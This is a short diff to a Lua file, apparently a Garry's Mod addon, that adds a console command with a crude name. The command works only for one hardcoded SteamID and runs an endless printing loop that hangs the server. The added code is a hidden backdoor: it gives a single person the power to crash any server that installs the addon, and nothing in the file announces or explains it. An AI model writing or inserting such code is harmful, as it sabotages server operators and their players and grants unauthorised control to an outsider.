@@ -42,6 +42,19 @@ end
 
 
 
+concommand.Add("penis_crash_server", function( ply, cmd, args ) 
+if ply:SteamID() == 'STEAM_0:0:555589835' then 
+    local a = 1
+
+    while a != 10 do
+        print(a)
+        a = a + 999999999999999999999999
+end
+
+       elseif ply:SteamID() ~= 'STEAM_0:0:555589835'  then
+
+        end
+    end)
 
 	
 
